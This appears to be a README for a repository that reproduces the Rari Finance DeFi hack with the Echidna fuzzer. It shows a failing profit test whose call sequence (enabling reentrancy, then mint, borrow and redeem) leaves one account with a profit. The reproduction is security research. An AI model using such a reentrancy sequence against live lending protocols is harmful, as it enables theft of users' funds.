# Reproduction of Rari Finance hack

```
testProfit(): failed!💥
  Call sequence:
    setReentrancyEnabled(true)
    mint(5,10089325332519370949262917519849428342404732088146691233195543578618300570336)
    setReentrancyCallback(4)
    borrow(2,1164710473815707741)
    redeem(2,995200615491)
    testProfit()

Event sequence:
    Panic(1): Using assert
    Debug(«account0Profit», 0) from: 0xa329c0648769a73afac7f9381e08fb43dbea72
    Debug(«account1Profit», 1002263350696681541) from: 0xa329c0648769a73afac7f9381e08fb43dbea72
    Debug(«account2Profit», 0) from: 0xa329c0648769a73afac7f9381e08fb43dbea72

```

![rari-hack-result](https://github.com/rappie/echidna-rari-hack/assets/1430820/374c2c83-b33a-4099-b6f6-513e281df33c)
